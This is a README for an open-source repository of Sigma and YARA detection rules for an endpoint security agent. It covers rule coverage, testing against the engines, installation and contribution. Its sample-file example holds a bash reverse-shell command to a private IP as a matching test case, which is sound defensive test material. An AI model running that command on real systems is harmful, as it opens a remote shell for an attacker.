# Synthaea Rules

Detection content for [Synthaea](https://github.com/synthaea-lab/agent), the open-source
EDR/XDR for Linux, Windows and macOS. This repository holds the Sigma and YARA rules the
agent evaluates on the endpoint. It is kept apart from the engine code so that content can
be reviewed, tested and released on its own cadence.

> [!WARNING]
> Synthaea is **alpha** software, and so is this content. Rules, directory layout and the
> sample format change between versions. Use them on test machines, not on production
> endpoints.

## What is inside

| Directory | Content | Evaluated by |
| --- | --- | --- |
| [`sigma/`](sigma/) | Behavioral rules on process execution events, one directory per platform | the agent's `sigma` engine |
| [`yara/`](yara/) | File and process-memory content rules, one directory per category | the agent's `yara` engine (YARA-X) |

The Sigma rules cover Linux, Windows and macOS: reverse shells, encoded and piped commands,
credential dumping (LSASS, SAM and SECURITY hives, NTDS, `/etc/shadow`), persistence through
cron, SSH keys, services and scheduled tasks, privilege escalation through GTFOBins and
capabilities, security-tool tampering (Defender, firewall, auditd), lateral movement with
PsExec and WMIC, and exfiltration to paste and cloud storage services. The YARA rules detect
minimal PHP and JSP web shells, plus a marker rule for the benign payloads used in lab
scenarios.

Every rule carries a severity, a false-positive note and at least one MITRE ATT&CK technique.

## Detection as code

A rule that nothing can trigger is dead content. Every rule in this repository is tested
against the real engines from [synthaea-lab/agent](https://github.com/synthaea-lab/agent):

- each Sigma rule must load within the
  [subset of Sigma the agent supports](https://github.com/synthaea-lab/agent/blob/main/docs/detection/sigma.md#supported-subset),
  and each YARA file must compile; an unsupported or broken rule fails loudly, naming the file;
- each rule must fire on a crafted matching sample and stay quiet on a near miss.

Sigma samples sit next to their rule as `<rule>.samples.json`:

```json
{
  "matching": {
    "image": "/bin/bash",
    "cmdline": "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
  },
  "non_matching": {
    "image": "/usr/bin/nc",
    "cmdline": "nc -zv host 22",
    "note": "Near miss: nc used to scan/connect, not to spawn a shell; the rule's boundary is the -e exec flag, not the binary itself."
  }
}
```

## Using the rules

The agent loads rules from `<content-dir>/rules/sigma` and `<content-dir>/rules/yara`. The
content directory defaults to `<storage.state_dir>/content` (`/var/lib/synthaea/content` on
Linux). A host loads only the Sigma directories for its platform:

| Host | Loads |
| --- | --- |
| Linux | `sigma/linux/` |
| Windows | `sigma/windows/` |
| macOS | `sigma/macos/` and `sigma/linux/` |

The agent packages do not bundle these rules yet. To use them, copy `sigma/` and `yara/`
into `<content-dir>/rules/`, or run `agent run --content-dir <dir>` where `<dir>` contains
this checkout as `rules/`. With a control plane, content is distributed as a signed
manifest per rollout ring. The
[detection content guide](https://www.synthaea.com/en/docs/detection-content) covers both
paths.

## Validating locally

The content suites live in the agent repository. Clone both repositories side by side:

```sh
git clone https://github.com/synthaea-lab/rules
git clone https://github.com/synthaea-lab/agent
cd agent
cargo test -p sigma --test content --test platform
cargo test -p yara --test content
```

The Rust toolchain is pinned by the agent's `rust-toolchain.toml` and installed by `rustup`
on first use. On Linux the agent repository runs test binaries through `sudo -E`, so expect a
password prompt. [CONTRIBUTING.md](CONTRIBUTING.md) describes the suites in detail.

## Contributing

New rules, sharper boundaries on existing ones and false-positive reports are welcome. Read
[CONTRIBUTING.md](CONTRIBUTING.md) for the rule and sample conventions, and the
[organization contributing guide](https://github.com/synthaea-lab/.github/blob/main/CONTRIBUTING.md)
for the rules that apply to every Synthaea repository. Commits need a Developer Certificate
of Origin sign-off (`git commit -s`).

A rule that misses an attack it should catch, or fires on benign activity, is an ordinary
issue. A way to blind, crash or bypass the agent itself is a security report: follow the
[security policy](https://github.com/synthaea-lab/.github/blob/main/SECURITY.md) instead of
opening a public issue.

## Related projects

- [agent](https://github.com/synthaea-lab/agent): the endpoint agent and the engines that run these rules
- [server](https://github.com/synthaea-lab/server): the self-hosted control plane that distributes content
- [scenarios](https://github.com/synthaea-lab/scenarios): attack scenarios that exercise the detections

## License

Licensed under the [Apache License, Version 2.0](LICENSE). See [NOTICE](NOTICE).
